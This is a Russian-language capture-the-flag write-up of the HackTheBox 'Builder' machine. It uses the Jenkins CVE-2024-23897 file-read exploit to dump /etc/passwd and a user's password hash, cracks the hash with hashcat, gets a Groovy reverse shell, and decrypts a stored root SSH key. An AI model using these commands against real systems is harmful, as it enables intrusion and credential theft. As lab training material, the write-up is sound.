# Builder (2025)

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure></div>

## Тэги:

* CVE-2024-23897
* Jenkins Enumeration

## Разведка

При сканировании портов было обнаружено два открытых `tcp`-порта `22` и `8080`:

```shellscript
$ nmap -sC -sV 10.129.230.220 -oN nmap.out
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-29 14:58 EST
Nmap scan report for 10.129.230.220
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

На `8080` порте был `Jenkins` версии `2.441`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure></div>

## Получение первоначального доступа - jenkins (LFI,  Groovy Reverse Shell)

На [exploit-db.com](https://www.exploit-db.com/) можно найти следующий `LFI`-эксплоит для данной версии `Jenkins`:

{% embed url="https://www.exploit-db.com/exploits/51993" %}

С помощью него был прочитан файл `/etc/passwd`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
└─$ python3 51993 -u http://10.129.230.220:8080/ -p /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

Далее можно было прочитать файл `users.xml`, который содержит информацию о пользователях:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
└─$ python3 51993 -u http://10.129.230.220:8080/ -p /var/jenkins_home/users/users.xml
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
```

И прочитать конкретный файл пользователя - `config.xml`, который содержит хеш пароля:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
└─$ python3 51993 -u http://10.129.230.220:8080/ -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">
    <hudson.search.UserSearchProperty>
      <roles>
    <jenkins.security.seed.UserSeedProperty>
      </tokenStore>
    </hudson.search.UserSearchProperty>
      <timeZoneName></timeZoneName>
  <properties>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <flags/>
    <hudson.model.MyViewsProperty>
</user>
    </jenkins.security.ApiTokenProperty>
      <views>
        <string>authenticated</string>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">
<user>
          <name>all</name>
  <description></description>
      <emailAddress>jennifer@builder.htb</emailAddress>
      <collapsed/>
    </jenkins.security.seed.UserSeedProperty>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    </hudson.model.MyViewsProperty>
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
          <filterQueue>false</filterQueue>
    <jenkins.security.ApiTokenProperty>
      <primaryViewName></primaryViewName>
      </views>
    </hudson.model.TimeZoneProperty>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">
    </hudson.model.PaneStatusProperties>
    </hudson.tasks.Mailer_-UserProperty>
        <tokenList/>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
        </hudson.model.AllView>
      <timestamp>1707318554385</timestamp>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
  </properties>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <insensitiveSearch>true</insensitiveSearch>
          <properties class="hudson.model.View$PropertyList"/>
    <hudson.model.TimeZoneProperty>
        <hudson.model.AllView>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
      <providerId>default</providerId>
      </roles>
    </jenkins.security.LastGrantedAuthoritiesProperty>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    <hudson.model.PaneStatusProperties>
<?xml version='1.1' encoding='UTF-8'?>
  <fullName>jennifer</fullName>
      <seed>6841d11dc1de101d</seed>
  <id>jennifer</id>
  <version>10</version>
      <tokenStore>
          <filterExecutors>false</filterExecutors>
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```

Тип хеша можно определить исходя из подписи `jbcrypt` или утилиты `hashid`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
└─$ hashid -j '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a'
Analyzing '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a'
[+] Blowfish(OpenBSD) [JtR Format: bcrypt]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [JtR Format: bcrypt]
```

Сбрутить хеш можно с помощью утилиты `hashcat`:

```shellscript
┌──(trager㉿hackandgtfo)-[~/HackTheBox/Builder]
└─$ sudo hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt 
<...вырезано...>
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
<...вырезано...>
```

После этого в Jenkins можно авторизоваться с УД `jennifer`/`princess`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure></div>

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure></div>

Чтобы получить шелл, нужно перейти в `Manage Jenkins` -> `Script Console` (`/manage/script`):

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure></div>

С помощью данной страницы можно выполнять `Groovy`-код. У [Reverse Shell Generator](https://www.revshells.com/) и для этого есть отдельная вкладка:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure></div>

Таким образом был получен реверс шелл:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure></div>

И стабилизирована оболочка с помощью `/usr/bin/script`, поскольку интерпретатор `python` отсутствовал:

```shellscript
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure></div>

## Повышение привилегий - root (Jenkins id\_rsa)

В файле `/var/jenkinks_home/credentials.xml` был обнаружен зашифрованный `id_rsa` ключ для суперпользователя:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure></div>

Для расшифровки была использована всё та же страница, что и для выполнения полезной нагрузки с реверс шеллом (`/manage/script`):

```groovy
println(hudson.util.Secret.fromString("{AQAAA...вырезано>KSM=}").getPlainText())
```

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure></div>

Далее ключ был использован для подключения к хосту от имени пользователя `root`:

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure></div>

<div data-with-frame="true"><figure><img src="../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure></div>

